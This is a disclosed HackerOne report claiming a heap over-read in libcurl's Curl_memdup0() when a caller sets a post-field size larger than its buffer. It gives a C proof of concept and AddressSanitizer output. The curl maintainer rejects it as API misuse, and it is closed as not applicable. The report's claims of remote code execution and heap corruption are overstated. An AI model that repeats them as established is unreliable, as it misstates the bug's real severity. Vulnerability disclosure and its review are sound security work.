---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/buffer-over-read
  - env/web
substate: "not-applicable"
weakness: "Buffer Over-read"
enriched: true
body: true
date: 2025-08-09
submitted: 2025-08-09T02:32:38.906Z
bounty_usd: null
votes: 19
cve: []
program: "[[programs/curl|curl]]"
reporter: "geeknik"
source: "https://hackerone.com/reports/3292590"
title: "Heap Buffer Overflow in Curl_memdup0() via CURLOPT_COPYPOSTFIELDS/CURLOPT_POSTFIELDSIZE Mismatch"
---
# Heap Buffer Overflow in Curl_memdup0() via CURLOPT_COPYPOSTFIELDS/CURLOPT_POSTFIELDSIZE Mismatch

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 19 | **Program:** curl | **Disclosed:** 2025-08-09

- Report: [https://hackerone.com/reports/3292590](https://hackerone.com/reports/3292590)
- CWE: Buffer Over-read
- Submitted: 2025-08-09T02:32:38.906Z

## Report summary

This report demonstrates a heap buffer overflow in `Curl_memdup0()` triggered when `CURLOPT_COPYPOSTFIELDS` is called after `CURLOPT_POSTFIELDSIZE` is set to a value larger than the actual buffer length.

While this may be considered an API contract violation, the resulting behavior is not merely “undefined”, it is predictably exploitable memory corruption in a widely deployed network library. In practice, `POST` data length values can originate from untrusted sources such as:
	->	Length fields in higher-layer protocols
	->	User-controlled input in proxying or gateway scenarios
	->	Data marshalled between disparate components where size and buffer are provided separately

A malicious actor does not need to be the developer to exploit this; they only need influence over the size parameter in an integration that uses `CURLOPT_COPYPOSTFIELDS`.

Robust, security-conscious libraries defend against common misuse, especially when the misuse is trivially detectable at runtime. Adding a bounds check in `Curl_memdup0()` (e.g., verifying the buffer length before memcpy) would prevent heap memory disclosure, application crashes, or potential code execution, and would not break correct API usage.

In security terms:
	->	Bug class: Heap Buffer Overflow
	->	Impact: Information disclosure, DoS, potential RCE with heap shaping
	-> Root cause: No bounds validation in Curl_memdup0() when size parameter is larger than provided data
	-> Fix class: Defensive length validation before memcpy

*A caller bug should not translate into an attacker-controlled heap overflow in a security-critical library.*

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary
A heap buffer overflow vulnerability exists in libcurl's `Curl_memdup0()` function when handling `CURLOPT_COPYPOSTFIELDS` operations. The vulnerability occurs when libcurl internally processes POST data where the specified `CURLOPT_POSTFIELDSIZE` exceeds the actual buffer size of data set via `CURLOPT_COPYPOSTFIELDS`. This is a legitimate use case that libcurl should handle safely, but currently results in out-of-bounds memory access.

## POC
### Environment
* libcurl version: 8.16.0-DEV (master branch)
* Compiler: Clang 20.1.8 with Address Sanitizer
* OS: MacOS 26 Dev Beta 5

`gcc -fsanitize=address -g -o poc poc.c -lcurl`
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

#define ACTUAL_SIZE 105
#define CLAIMED_SIZE 976909154L

int main(void) {
    printf("[+] libcurl Heap Buffer Overflow PoC\n");
    printf("[+] CURLOPT_COPYPOSTFIELDS vulnerability reproduction\n\n");
    
    /* Initialize libcurl */
    curl_global_init(CURL_GLOBAL_ALL);
    CURL *curl = curl_easy_init();
    
    if(!curl) {
        fprintf(stderr, "[!] Failed to initialize curl\n");
        return 1;
    }
    
    printf("[+] libcurl initialized successfully\n");
    
    /* CRITICAL: Allocate buffer on HEAP, not stack */
    char *heap_buffer = (char *)malloc(ACTUAL_SIZE);
    if(!heap_buffer) {
        fprintf(stderr, "[!] Failed to allocate heap buffer\n");
        curl_easy_cleanup(curl);
        return 1;
    }
    
    /* Fill with test data */
    memset(heap_buffer, 'A', ACTUAL_SIZE - 1);
    heap_buffer[ACTUAL_SIZE - 1] = '\0';
    
    printf("[+] Allocated HEAP buffer: %d bytes at %p\n", ACTUAL_SIZE, (void*)heap_buffer);
    printf("[+] Buffer content: \"%.50s...\"\n", heap_buffer);
    
    /* Set a basic URL (won't actually connect) */
    curl_easy_setopt(curl, CURLOPT_URL, "http://example.com");
    
    /* Set POST mode */
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    
    /* VULNERABILITY TRIGGER - Set size much larger than actual buffer */
    printf("[+] Setting CURLOPT_POSTFIELDSIZE to: %ld bytes\n", CLAIMED_SIZE);
    CURLcode res = curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, CLAIMED_SIZE);
    if(res != CURLE_OK) {
        fprintf(stderr, "[!] Failed to set POSTFIELDSIZE: %s\n", curl_easy_strerror(res));
        free(heap_buffer);
        curl_easy_cleanup(curl);
        return 1;
    }
    printf("[+] CURLOPT_POSTFIELDSIZE set successfully\n");
    
    /* TRIGGER THE HEAP BUFFER OVERFLOW */
    printf("[+] Calling CURLOPT_COPYPOSTFIELDS with %d-byte heap buffer...\n", ACTUAL_SIZE);
    printf("[!] This should trigger HEAP buffer overflow in Curl_memdup0()\n");
    printf("[!] AddressSanitizer should detect out-of-bounds read on HEAP\n\n");
    
    /* This will cause Curl_memdup0() to read CLAIMED_SIZE bytes from ACTUAL_SIZE buffer */
    res = curl_easy_setopt(curl, CURLOPT_COPYPOSTFIELDS, heap_buffer);
    
    if(res == CURLE_OK) {
        printf("[?] CURLOPT_COPYPOSTFIELDS succeeded (unexpected if ASAN enabled)\n");
        printf("[?] The overflow may have occurred silently\n");
    } else {
        printf("[!] CURLOPT_COPYPOSTFIELDS failed: %s\n", curl_easy_strerror(res));
    }
    
    /* Cleanup */
    free(heap_buffer);
    curl_easy_cleanup(curl);
    curl_global_cleanup();
    
    printf("[+] If you see this, the overflow was not detected\n");
    printf("[!] Run with AddressSanitizer: gcc -fsanitize=address poc.c -lcurl\n");
    
    return 0;
}
```

## Vulnerable Code Path 
`CURLOPT_POSTFIELDSIZE` set to 976909154
`CURLOPT_COPYPOSTFIELDS` given 105-byte buffer
`Curl_memdup0()` blindly trusts the size parameter
No validation that size matches actual buffer
Detection: Compile with AddressSanitizer (-fsanitize=address) to observe heap buffer overflow.

```
[+] libcurl Heap Buffer Overflow PoC
[+] CURLOPT_COPYPOSTFIELDS vulnerability reproduction

[+] libcurl initialized successfully
[+] Allocated HEAP buffer: 105 bytes at 0x60b000002fb0
[+] Buffer content: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA..."
[+] Setting CURLOPT_POSTFIELDSIZE to: 976909154 bytes
[+] CURLOPT_POSTFIELDSIZE set successfully
[+] Calling CURLOPT_COPYPOSTFIELDS with 105-byte heap buffer...
[!] This should trigger HEAP buffer overflow in Curl_memdup0()
[!] AddressSanitizer should detect out-of-bounds read on HEAP

=================================================================
==33081==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60b000003019 at pc 0x000101451c64 bp 0x00016f33df30 sp 0x00016f33d6d0
READ of size 976909154 at 0x60b000003019 thread T0
    #0 0x000101451c60 in memcpy+0x284 (libclang_rt.asan_osx_dynamic.dylib:arm64e+0x85c60)
    #1 0x0001acb23954 in Curl_memdup0+0x44 (libcurl.4.dylib:arm64e+0x4e954)
    #2 0x0001acb1a678 in Curl_vsetopt+0xc60 (libcurl.4.dylib:arm64e+0x45678)
    #3 0x0001acb1d4c0 in curl_easy_setopt+0x20 (libcurl.4.dylib:arm64e+0x484c0)
    #4 0x000100ac0b50 in main poc_heap_overflow_fixed.c:73
    #5 0x000190b41920 in start+0x18fc (dyld:arm64e+0x3920)

0x60b000003019 is located 0 bytes after 105-byte region [0x60b000002fb0,0x60b000003019)
allocated by thread T0 here:
    #0 0x00010140930c in malloc+0x78 (libclang_rt.asan_osx_dynamic.dylib:arm64e+0x3d30c)
    #1 0x000100ac0904 in main poc_heap_overflow_fixed.c:36
    #2 0x000190b41920 in start+0x18fc (dyld:arm64e+0x3920)

SUMMARY: AddressSanitizer: heap-buffer-overflow (libcurl.4.dylib:arm64e+0x4e954) in Curl_memdup0+0x44
Shadow bytes around the buggy address:
  0x60b000002d80: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd
  0x60b000002e00: fd fd fa fa fa fa fa fa fa fa fd fd fd fd fd fd
  0x60b000002e80: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa
  0x60b000002f00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa
  0x60b000002f80: fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00
=>0x60b000003000: 00 00 00[01]fa fa fa fa fa fa fa fa fa fa fa fa
  0x60b000003080: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x60b000003100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x60b000003180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x60b000003200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x60b000003280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==33081==ABORTING
```

## Impact

## Severity: High

### Security Impact:
> Information Disclosure: Out-of-bounds read exposes adjacent heap memory contents
> Potential RCE: Heap layout manipulation may enable code execution in specific scenarios
> Denial of Service: Memory access violations cause application crashes
> Data Corruption: Heap metadata corruption affects application stability

### Attack Scenarios:
> Applications that accept user-controlled POST data sizes
> Network services processing untrusted HTTP POST parameters
> Any application where attackers can influence both POST data and size parameters

### Real-World Relevance:
> This affects legitimate use cases where applications might:
> Truncate or pad POST data based on protocol requirements
> Process variable-length content with fixed-size headers
> Handle network protocols with length prefixes

## Timeline

- **Report Filed**
- **Report Vulnerability Information Updated**
- **2025-08-09** @bagder: This is an API violation. Also, curl cannot know the "real" size.
- **Report Not Applicable**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
